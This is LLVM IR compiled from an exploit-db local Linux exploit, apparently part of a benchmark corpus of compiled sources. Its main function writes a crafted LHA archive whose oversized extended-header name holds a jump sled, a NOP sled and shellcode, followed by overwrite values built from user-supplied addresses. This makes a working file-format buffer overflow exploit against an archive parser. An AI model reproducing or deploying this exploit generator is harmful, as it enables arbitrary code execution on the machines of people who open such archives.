; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_2404.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_2404.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [24 x i8] c"Error allocating memory\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"0x%x\00", align 1
@I_HEADER_SIZE = common dso_local global i32 0, align 4
@I_HEADER_CHECKSUM = common dso_local global i32 0, align 4
@I_METHOD = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [6 x i8] c"-lh0-\00", align 1
@I_PACKED_SIZE = common dso_local global i32 0, align 4
@I_ORIGINAL_SIZE = common dso_local global i32 0, align 4
@I_LAST_MODIFIED_STAMP = common dso_local global i32 0, align 4
@I_ATTRIBUTE = common dso_local global i32 0, align 4
@I_HEADER_LEVEL = common dso_local global i32 0, align 4
@I_NAME_LENGTH = common dso_local global i32 0, align 4
@I_NAME = common dso_local global i32 0, align 4
@I_CRC = common dso_local global i32 0, align 4
@I_EXTEND_TYPE = common dso_local global i32 0, align 4
@E_HEADER_SIZE = common dso_local global i32 0, align 4
@E_HEADER_TYPE = common dso_local global i32 0, align 4
@E_HEADER_NAME = common dso_local global i32 0, align 4
@shellcode1 = common dso_local global i8* null, align 8
@DEBUG = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [18 x i8] c"%d bytes written\0A\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c"Cant write to the file\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = call i64 @malloc(i32 4096)
  %17 = inttoptr i64 %16 to i8*
  store i8* %17, i8** %7, align 8
  %18 = call i64 @malloc(i32 256)
  %19 = inttoptr i64 %18 to i8*
  store i8* %19, i8** %14, align 8
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %25, label %22

22:                                               ; preds = %2
  %23 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %24 = call i32 @exit(i32 -1) #3
  unreachable

25:                                               ; preds = %2
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, 4
  br i1 %27, label %28, label %33

28:                                               ; preds = %25
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @usage(i8* %31)
  br label %33

33:                                               ; preds = %28, %25
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @sscanf(i8* %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i32* %12)
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 2
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @sscanf(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i32* %13)
  %42 = load i8*, i8** %14, align 8
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 3
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @strncpy(i8* %42, i8* %45, i32 255)
  %47 = load i8*, i8** %7, align 8
  %48 = call i32 @memset(i8* %47, i32 0, i32 4096)
  store i32 29, i32* %9, align 4
  %49 = load i8*, i8** %7, align 8
  %50 = load i32, i32* @I_HEADER_SIZE, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = load i32, i32* %9, align 4
  %54 = call i32 @put_byte(i8* %52, i32 %53)
  %55 = load i8*, i8** %7, align 8
  %56 = load i32, i32* @I_HEADER_CHECKSUM, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = call i32 @put_byte(i8* %58, i32 83)
  %60 = load i8*, i8** %7, align 8
  %61 = load i32, i32* @I_METHOD, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = call i32 @memcpy(i8* %63, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i32 5)
  %65 = load i8*, i8** %7, align 8
  %66 = load i32, i32* @I_PACKED_SIZE, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i32 @put_longword(i8* %68, i32 4660)
  %70 = load i8*, i8** %7, align 8
  %71 = load i32, i32* @I_ORIGINAL_SIZE, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  %74 = call i32 @put_longword(i8* %73, i32 4660)
  %75 = load i8*, i8** %7, align 8
  %76 = load i32, i32* @I_LAST_MODIFIED_STAMP, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = call i32 @put_longword(i8* %78, i32 4660)
  %80 = load i8*, i8** %7, align 8
  %81 = load i32, i32* @I_ATTRIBUTE, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = call i32 @put_byte(i8* %83, i32 32)
  %85 = load i8*, i8** %7, align 8
  %86 = load i32, i32* @I_HEADER_LEVEL, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = call i32 @put_byte(i8* %88, i32 1)
  %90 = load i8*, i8** %7, align 8
  %91 = load i32, i32* @I_NAME_LENGTH, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = call i32 @put_byte(i8* %93, i32 4)
  %95 = load i8*, i8** %7, align 8
  %96 = load i32, i32* @I_NAME, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %95, i64 %97
  %99 = call i32 @put_longword(i8* %98, i32 -1869574000)
  %100 = load i8*, i8** %7, align 8
  %101 = load i32, i32* @I_CRC, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  %104 = call i32 @put_word(i8* %103, i32 26214)
  %105 = load i8*, i8** %7, align 8
  %106 = load i32, i32* @I_EXTEND_TYPE, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  %109 = call i32 @put_byte(i8* %108, i32 85)
  %110 = load i8*, i8** %7, align 8
  %111 = load i32, i32* %9, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %110, i64 %112
  %114 = load i32, i32* @E_HEADER_SIZE, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %113, i64 %115
  %117 = call i32 @put_word(i8* %116, i32 285)
  %118 = load i8*, i8** %7, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i32, i32* @E_HEADER_TYPE, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i8, i8* %121, i64 %123
  %125 = call i32 @put_byte(i8* %124, i32 2)
  %126 = load i8*, i8** %7, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  %130 = load i32, i32* @E_HEADER_NAME, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %129, i64 %131
  %133 = call i32 @memset(i8* %132, i32 65, i32 266)
  store i32 0, i32* %15, align 4
  %134 = load i8*, i8** %7, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  %138 = load i32, i32* @E_HEADER_NAME, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8, i8* %137, i64 %139
  store i8* %140, i8** %8, align 8
  br label %141

141:                                              ; preds = %148, %33
  %142 = load i32, i32* %15, align 4
  %143 = load i8*, i8** @shellcode1, align 8
  %144 = call i32 @strlen(i8* %143)
  %145 = sub nsw i32 240, %144
  %146 = sub nsw i32 %145, 10
  %147 = icmp slt i32 %142, %146
  br i1 %147, label %148, label %159

148:                                              ; preds = %141
  %149 = load i8*, i8** %8, align 8
  %150 = load i32, i32* %15, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %15, align 4
  %152 = sext i32 %150 to i64
  %153 = getelementptr inbounds i8, i8* %149, i64 %152
  store i8 -21, i8* %153, align 1
  %154 = load i8*, i8** %8, align 8
  %155 = load i32, i32* %15, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %15, align 4
  %157 = sext i32 %155 to i64
  %158 = getelementptr inbounds i8, i8* %154, i64 %157
  store i8 10, i8* %158, align 1
  br label %141

159:                                              ; preds = %141
  br label %160

160:                                              ; preds = %166, %159
  %161 = load i32, i32* %15, align 4
  %162 = load i8*, i8** @shellcode1, align 8
  %163 = call i32 @strlen(i8* %162)
  %164 = sub nsw i32 240, %163
  %165 = icmp slt i32 %161, %164
  br i1 %165, label %166, label %172

166:                                              ; preds = %160
  %167 = load i8*, i8** %8, align 8
  %168 = load i32, i32* %15, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %15, align 4
  %170 = sext i32 %168 to i64
  %171 = getelementptr inbounds i8, i8* %167, i64 %170
  store i8 -112, i8* %171, align 1
  br label %160

172:                                              ; preds = %160
  %173 = load i8*, i8** %7, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds i8, i8* %173, i64 %175
  %177 = load i32, i32* @E_HEADER_NAME, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8, i8* %176, i64 %178
  %180 = getelementptr inbounds i8, i8* %179, i64 240
  %181 = load i8*, i8** @shellcode1, align 8
  %182 = call i32 @strlen(i8* %181)
  %183 = sext i32 %182 to i64
  %184 = sub i64 0, %183
  %185 = getelementptr inbounds i8, i8* %180, i64 %184
  %186 = load i8*, i8** @shellcode1, align 8
  %187 = load i8*, i8** @shellcode1, align 8
  %188 = call i32 @strlen(i8* %187)
  %189 = call i32 @memcpy(i8* %185, i8* %186, i32 %188)
  %190 = load i8*, i8** %7, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i8, i8* %190, i64 %192
  %194 = load i32, i32* @E_HEADER_NAME, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i8, i8* %193, i64 %195
  %197 = getelementptr inbounds i8, i8* %196, i64 266
  %198 = call i32 @put_longword(i8* %197, i32 1094795585)
  %199 = load i8*, i8** %7, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i8, i8* %199, i64 %201
  %203 = load i32, i32* @E_HEADER_NAME, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i8, i8* %202, i64 %204
  %206 = getelementptr inbounds i8, i8* %205, i64 270
  %207 = call i32 @put_longword(i8* %206, i32 -1209840446)
  %208 = load i8*, i8** %7, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds i8, i8* %208, i64 %210
  %212 = load i32, i32* @E_HEADER_NAME, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds i8, i8* %211, i64 %213
  %215 = getelementptr inbounds i8, i8* %214, i64 274
  %216 = load i32, i32* %12, align 4
  %217 = sub i32 %216, 12
  %218 = call i32 @put_longword(i8* %215, i32 %217)
  %219 = load i8*, i8** %7, align 8
  %220 = load i32, i32* %9, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds i8, i8* %219, i64 %221
  %223 = load i32, i32* @E_HEADER_NAME, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds i8, i8* %222, i64 %224
  %226 = getelementptr inbounds i8, i8* %225, i64 278
  %227 = load i32, i32* %13, align 4
  %228 = call i32 @put_longword(i8* %226, i32 %227)
  %229 = load i8*, i8** %7, align 8
  %230 = load i32, i32* %9, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds i8, i8* %229, i64 %231
  %233 = load i32, i32* @E_HEADER_NAME, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = getelementptr inbounds i8, i8* %235, i64 282
  %237 = call i32 @put_word(i8* %236, i32 0)
  %238 = load i32, i32* %9, align 4
  %239 = add nsw i32 %238, 284
  %240 = load i32, i32* @E_HEADER_NAME, align 4
  %241 = add nsw i32 %239, %240
  store i32 %241, i32* %11, align 4
  %242 = load i8*, i8** %14, align 8
  %243 = call i32* @open_file(i8* %242)
  store i32* %243, i32** %6, align 8
  %244 = load i8*, i8** %7, align 8
  %245 = load i32, i32* %11, align 4
  %246 = load i32*, i32** %6, align 8
  %247 = call i32 @fwrite(i8* %244, i32 1, i32 %245, i32* %246)
  store i32 %247, i32* %10, align 4
  %248 = icmp ne i32 %247, 0
  br i1 %248, label %249, label %256

249:                                              ; preds = %172
  %250 = load i64, i64* @DEBUG, align 8
  %251 = icmp ne i64 %250, 0
  br i1 %251, label %252, label %255

252:                                              ; preds = %249
  %253 = load i32, i32* %10, align 4
  %254 = call i32 @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0), i32 %253)
  br label %255

255:                                              ; preds = %252, %249
  br label %258

256:                                              ; preds = %172
  %257 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  br label %258

258:                                              ; preds = %256, %255
  %259 = load i32*, i32** %6, align 8
  %260 = call i32 @fclose(i32* %259)
  ret i32 0
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @put_byte(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @put_longword(i8*, i32) #1

declare dso_local i32 @put_word(i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32* @open_file(i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
